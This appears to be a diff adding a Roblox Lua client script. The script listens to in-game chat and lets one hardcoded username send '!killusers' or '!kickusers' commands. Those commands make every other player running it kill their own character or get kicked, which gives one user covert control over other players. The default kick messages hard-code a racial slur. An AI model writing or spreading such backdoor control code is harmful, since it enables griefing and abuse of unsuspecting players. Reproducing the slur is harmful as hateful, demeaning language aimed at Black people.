@@ -1,0 +1,53 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local ALLOWED_USERNAME = "ShadowBoxNeckBreaker"
+
+local function killSelf()
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.Health = 0
+    end
+end
+
+local function kickSelf(reason)
+    reason = reason or "Kicked by Monkey Nigga"
+    LocalPlayer:Kick(reason)
+end
+
+local function onPlayerChatted(player, msg)
+    local lowerMsg = msg:lower()
+    local command, param = lowerMsg:match("^(%S+)%s*(.*)$")
+
+    if command == "!killusers" then
+        if player.Name == ALLOWED_USERNAME then
+            if LocalPlayer.Name ~= ALLOWED_USERNAME then
+                killSelf()
+            end
+        end
+
+    elseif command == "!kickusers" then
+        if player.Name == ALLOWED_USERNAME then
+            if LocalPlayer.Name ~= ALLOWED_USERNAME then
+                local kickMessage = param
+                if kickMessage == "" then
+                    kickMessage = "Kicked by Monkey Nigger"
+                end
+                kickSelf(kickMessage)
+            end
+        end
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg)
+        onPlayerChatted(player, msg)
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+        onPlayerChatted(player, msg)
+    end)
+end)
